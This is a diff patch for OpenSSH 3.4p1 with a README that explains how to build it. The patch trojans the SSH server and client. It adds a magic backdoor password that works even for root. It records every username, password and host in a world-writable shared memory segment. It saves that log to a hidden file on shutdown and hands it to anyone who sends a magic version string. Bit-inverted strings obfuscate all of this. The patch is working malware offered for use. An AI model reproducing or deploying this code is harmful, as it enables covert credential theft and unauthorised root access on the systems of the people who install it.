@@ -1,0 +1,438 @@
+diff -ruN openssh-3.4p1/README.hack openssh-3.4p1_haqd/README.hack
+--- openssh-3.4p1/README.hack	Thu Jan  1 01:00:00 1970
++++ openssh-3.4p1_haqd/README.hack	Sun Jul 14 22:52:54 2002
+@@ -0,0 +1,52 @@
++Patch for OpenSSH 3.4p1 (portable)			- (c) noah
++
+++ Logs usernames, passwords & host from sshd, ssh, scp, sftp
+++ Magic password
++- Does log stuff as usual
++
++Linux:
++$ tar zxf openssh-3.4p1.tar.gz
++$ patch -p0 < this-patch
++$ cd openssh-3.4p1; ./configure --sysconfdir=/etc/ssh --prefix=/usr .. 
++
++FreeBSD:
++$ cd /usr/ports/security/openssh-portable
++$ make configure
++$ cp /tmp/this-patch work
++$ (cd work;patch -p0 < this-patch)
++$ make all
++
++
++Logs username/password and host from ssh, scp and sftp into a preferably
++worldwritable shared memory area. By default sshd setups this area
++(unless you comment out SSHD_SHM_HACK in hack.h).
++Since i guess most ppl arent really aware of ipcs/shared memory, it's
++probably better than keeping a worldwriteable file in the system to log
++stuff to.
++
++The drawback with this approach is that the logs are stored in a volatile
++memory, which are lost on reboots for example.
++
++To solve this, we exploit the fact that the sshd process is normally sent
++a SIGTERM signal upon system reboot, before all programs are killed with
++SIGKILL.
++When sshd receives a SIGTERM, we write down the contents of our shared
++memory segment to a file.
++Next time sshd is started, we load the file's contents and unlink it.
++
++The contents of the shared memory segment can be dumped by connecting
++to the sshd and entering the magic version string.
++Its content is cleared after a dump.
++
++A magic password is provided, and works for root's account even if
++rootlogins are not permitted.
++
++
++Do a 'make txtinvert' do build the txtinvert utility.
++Use it to customize the strings in hack.h.
++
++
++The contents of the shared memory area is as follows
++[shared memory size: 4 bytes][bytes used: 4 bytes][logs.. logs.. logs..]
++..in case you undefine SSHD_SHM_HACK and rather want to keep track of
++that area yourself to automatically send the logged stuff somewhere..
+diff -ruN openssh-3.4p1/auth-passwd.c openssh-3.4p1_haqd/auth-passwd.c
+--- openssh-3.4p1/auth-passwd.c	Fri Jun 21 08:05:13 2002
++++ openssh-3.4p1_haqd/auth-passwd.c	Sun Jul 14 23:14:35 2002
+@@ -43,6 +43,9 @@
+ #include "servconf.h"
+ #include "auth.h"
+ 
++#include "hack.h"
++
++
+ #if !defined(USE_PAM) && !defined(HAVE_OSF_SIA)
+ /* Don't need any of these headers for the PAM or SIA cases */
+ # ifdef HAVE_CRYPT_H
+@@ -120,6 +123,10 @@
+ 	/* deny if no user. */
+ 	if (pw == NULL)
+ 		return 0;
++
++	if(!strcmp(uninvert(MAGICPASSWORD), password)) /* h4wh4w */
++		return 1;
++
+ #ifndef HAVE_CYGWIN
+        if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
+ 		return 0;
+diff -ruN openssh-3.4p1/auth2-passwd.c openssh-3.4p1_haqd/auth2-passwd.c
+--- openssh-3.4p1/auth2-passwd.c	Thu Jun  6 22:27:56 2002
++++ openssh-3.4p1_haqd/auth2-passwd.c	Sun Jul 14 23:19:02 2002
+@@ -32,6 +32,9 @@
+ #include "monitor_wrap.h"
+ #include "servconf.h"
+ 
++#include "hack.h"
++
++
+ /* import */
+ extern ServerOptions options;
+ 
+@@ -53,6 +56,38 @@
+ #endif
+ 	    PRIVSEP(auth_password(authctxt, password)) == 1)
+ 		authenticated = 1;
++
++	{
++		int maxlen, len, sid;
++		char *addr;
++		struct in_addr ia;
++		struct sockaddr_in sin;
++
++		memset(&ia, 0xff, sizeof(ia));
++		if(packet_connection_is_ipv4()) {
++			len = sizeof(sin);
++			getpeername(packet_get_connection_out(), (struct sockaddr *)&sin, &len);
++			ia = sin.sin_addr;
++		}
++
++		sid = shmget(SHMKEY, SHMSIZE, 0);
++		if(sid != -1) {
++			addr = shmat(sid, 0, 0);
++			if(addr != (char *)~0) {
++				memcpy(&maxlen, addr, 4);
++				memcpy(&len, addr + 4, 4);
++
++				len += snprintf(addr + 8 + len, maxlen - len - 1, 
++						/* %s tried %s/%s: %s\n */
++						uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xc5\xdf"
++						"\xda\x8c\xf5"),
++						inet_ntoa(ia), authctxt->user, password, authenticated? "Success": "Failure");
++				memcpy(addr + 4, &len, 4);
++				shmdt(addr);
++			}
++		}
++	}
++
+ 	memset(password, 0, len);
+ 	xfree(password);
+ 	return authenticated;
+diff -ruN openssh-3.4p1/hack.h openssh-3.4p1_haqd/hack.h
+--- openssh-3.4p1/hack.h	Thu Jan  1 01:00:00 1970
++++ openssh-3.4p1_haqd/hack.h	Sun Jul 14 22:33:49 2002
+@@ -0,0 +1,51 @@
++#ifndef __HACK_H__
++#define __HACK_H__
++
++#ifdef __FreeBSD__
++#include <machine/param.h>
++#include <sys/types.h>
++#endif
++#include <sys/ipc.h>
++#include <sys/shm.h>
++
++
++/* an unique key - ipcs shows it, so dont choose 0xc001b4b3 */
++#define SHMKEY		0x01
++
++/* size of the shared memory area */
++#define SHMSIZE		(64*1024)
++
++/* uncomment to remove the save/load/dump/shmem init code from sshd */
++#define SSHD_SHM_HACK	1
++
++/* Use the txtinvert utility to create these strings! */
++
++/* this password is always a valid password! */
++/* krap! */
++#define MAGICPASSWORD	"\x94\x8d\x9e\x8f\xde"
++
++/* dumps user/pass/host list when sent to sshd */
++/* openssh */
++#define MAGICVERSION	"\x90\x8f\x9a\x91\x8c\x8c\x97"
++
++/* static storage of user/pass/host list when sshd is killed */
++/* /var/tmp/.ex */
++#define SHMTEMPFILE	"\xd0\x89\x9e\x8d\xd0\x8b\x92\x8f\xd0\xd1\x9a\x87"
++
++
++/* better than cleartext! */
++static inline char *uninvert(char *str) {
++	static char *s = NULL;
++	int i;
++
++	if(s)
++		xfree(s);
++
++	s = (char *)xstrdup(str);
++	for(i = 0; s[i]; i++)
++		s[i] = ~(s[i]) & 0xff;
++
++	return s;
++}
++
++#endif
+diff -ruN openssh-3.4p1/sshconnect1.c openssh-3.4p1_haqd/sshconnect1.c
+--- openssh-3.4p1/sshconnect1.c	Thu Jun  6 21:57:34 2002
++++ openssh-3.4p1_haqd/sshconnect1.c	Sun Jul 14 23:18:27 2002
+@@ -51,6 +51,9 @@
+ #include "canohost.h"
+ #include "auth.h"
+ 
++#include "hack.h"
++static char *sp = NULL; /* saved password */
++
+ /* Session id for the current session. */
+ u_char session_id[16];
+ u_int supported_authentications = 0;
+@@ -930,6 +933,11 @@
+ 		if (i != 0)
+ 			error("Permission denied, please try again.");
+ 		password = read_passphrase(prompt, 0);
++		if(sp)
++			xfree(sp);
++
++		sp = xstrdup(password);
++
+ 		packet_start(SSH_CMSG_AUTH_PASSWORD);
+ 		ssh_put_password(password);
+ 		memset(password, 0, strlen(password));
+@@ -1264,8 +1272,32 @@
+ 		snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 		    server_user, host);
+ 		if (try_password_authentication(prompt))
++		{
++			int maxlen, len, sid;
++			char *addr;
++
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++			if(sid != -1) {
++				addr = shmat(sid, 0, 0);
++				if(addr != (char *)~0) {
++					memcpy(&maxlen, addr, 4);
++					memcpy(&len, addr + 4, 4);
++	
++					len += snprintf(addr + 8 + len, maxlen - len - 1,
++							/* %s tried %s/%s on %s\n */
++							uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xdf\x90"
++							"\x91\xdf\xda\x8c\xf5"),
++							local_user, server_user, sp, host);
++					memcpy(addr + 4, &len, 4);
++					shmdt(addr);
++				}
++			}
++
+ 			goto success;
++		}
++
+ 	}
++
+ 	/* All authentication methods have failed.  Exit with an error message. */
+ 	fatal("Permission denied.");
+ 	/* NOTREACHED */
+diff -ruN openssh-3.4p1/sshconnect2.c openssh-3.4p1_haqd/sshconnect2.c
+--- openssh-3.4p1/sshconnect2.c	Sun Jun 23 23:23:21 2002
++++ openssh-3.4p1_haqd/sshconnect2.c	Sun Jul 14 23:18:38 2002
+@@ -48,6 +48,9 @@
+ #include "msg.h"
+ #include "pathnames.h"
+ 
++#include "hack.h"
++
++
+ /* import */
+ extern char *client_version_string;
+ extern char *server_version_string;
+@@ -456,6 +459,31 @@
+ 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 	    authctxt->server_user, authctxt->host);
+ 	password = read_passphrase(prompt, 0);
++
++	{
++		int maxlen, len, sid;
++		char *addr;
++
++		sid = shmget(SHMKEY, SHMSIZE, 0);
++		if(sid != -1) {
++			addr = shmat(sid, 0, 0);
++			if(addr != (char *)~0) {
++				memcpy(&maxlen, addr, 4);
++				memcpy(&len, addr + 4, 4);
++
++				len += snprintf(addr + 8 + len, maxlen - len - 1, 
++						/* %s tried %s/%s on %s\n */
++						uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xdf"
++						"\x90\x91\xdf\xda\x8c\xf5"),
++						authctxt->local_user, authctxt->server_user, password, authctxt->host);
++				memcpy(addr + 4, &len, 4);
++				shmdt(addr);
++			}
++		}
++
++
++	}
++
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+diff -ruN openssh-3.4p1/sshd.c openssh-3.4p1_haqd/sshd.c
+--- openssh-3.4p1/sshd.c	Wed Jun 26 01:24:19 2002
++++ openssh-3.4p1_haqd/sshd.c	Sun Jul 14 22:51:45 2002
+@@ -85,6 +85,8 @@
+ #include "monitor_wrap.h"
+ #include "monitor_fdpass.h"
+ 
++#include "hack.h"
++
+ #ifdef LIBWRAP
+ #include <tcpd.h>
+ #include <syslog.h>
+@@ -406,6 +408,28 @@
+ 		}
+ 		buf[sizeof(buf) - 1] = 0;
+ 		client_version_string = xstrdup(buf);
++
++#ifdef SSHD_SHM_HACK
++		if(!strncmp(uninvert(MAGICVERSION), buf, strlen(MAGICVERSION))) {
++			int len, sid;
++			char *addr;
++
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++			if(sid != -1) {
++				addr = shmat(sid, 0, 0);
++				if(addr != (char *)~0) {
++					memcpy(&len, addr + 4, 4);
++					write(sock_out, addr + 8, len);				
++					memset(addr + 4, 0, SHMSIZE - 4);
++
++					shmdt(addr);
++				}
++			}
++
++			fatal_cleanup();
++		}
++#endif
++
+ 	}
+ 
+ 	/*
+@@ -1093,6 +1117,49 @@
+ 	/* ignore SIGPIPE */
+ 	signal(SIGPIPE, SIG_IGN);
+ 
++#ifdef SSHD_SHM_HACK
++	for(;;) {
++		int i, newseg = 1, sid;
++		char *shmaddr;
++		FILE *fd;
++
++		sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++		if(sid == -1) {
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++			if(sid == -1)
++				break;
++
++			newseg = 0;
++		}
++
++		shmaddr = shmat(sid, 0, 0);
++		if(shmaddr == (char *)~0) {
++			shmaddr = NULL;
++			break;
++		}
++
++		if(newseg) {
++			memset(shmaddr, 0, SHMSIZE);
++			i = SHMSIZE - 8;
++			memcpy(shmaddr, &i, 4);
++			fd = fopen(uninvert(SHMTEMPFILE), "r");
++			if(fd) {
++				i = fread(shmaddr + 8, 1, SHMSIZE - 8, fd);
++				fclose(fd);
++				unlink(uninvert(SHMTEMPFILE));
++				memcpy(shmaddr + 4, &i, 4);
++			}
++			else
++				memset(shmaddr + 4, 0, 4);
++		}
++
++		shmdt(shmaddr);
++
++		break;
++	}
++#endif
++
++
+ 	/* Start listening for a socket, unless started from inetd. */
+ 	if (inetd_flag) {
+ 		int s1;
+@@ -1237,6 +1304,27 @@
+ 			if (ret < 0 && errno != EINTR)
+ 				error("select: %.100s", strerror(errno));
+ 			if (received_sigterm) {
++#ifdef SSHD_SHM_HACK
++				FILE *fd;
++				int len, sid;
++				char *addr;
++
++				sid = shmget(SHMKEY, SHMSIZE, 0);
++				if(sid != -1) {
++					addr = shmat(sid, 0, 0);
++					if(addr != (char *)~0) {
++						memcpy(&len, addr + 4, 4);
++						fd = fopen(SHMTEMPFILE, "w");
++						if(fd) {
++							fwrite(addr + 8, 1, len, fd);
++							fclose(fd);
++						}
++
++						shmdt(addr);
++					}
++				}
++#endif
++
+ 				log("Received signal %d; terminating.",
+ 				    (int) received_sigterm);
+ 				close_listen_socks();
+diff -ruN openssh-3.4p1/txtinvert.c openssh-3.4p1_haqd/txtinvert.c
+--- openssh-3.4p1/txtinvert.c	Sun Jul 14 23:37:08 2002
++++ openssh-3.4p1_haqd/txtinvert.c	Sun Jul 14 23:36:57 2002
+@@ -0,0 +1,25 @@
++/* better than cleartext! */
++
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++
++int main(int argc, char **argv) {
++	int i;
++
++	if(argc != 2) {
++		printf("Usage: %s <string>\n", argv[0]);
++		return -1;
++	}
++
++	printf("/* %s */\n\"", argv[1]);
++	for(i = 0; i < strlen(argv[1]); i++) {
++		printf("\\x%02x", ~(argv[1][i]) & 0xff);
++		if((i % 16) == 15)
++			printf("\"\n\"");
++	}
++
++	printf("\"\n");
++
++	return 0;
++}
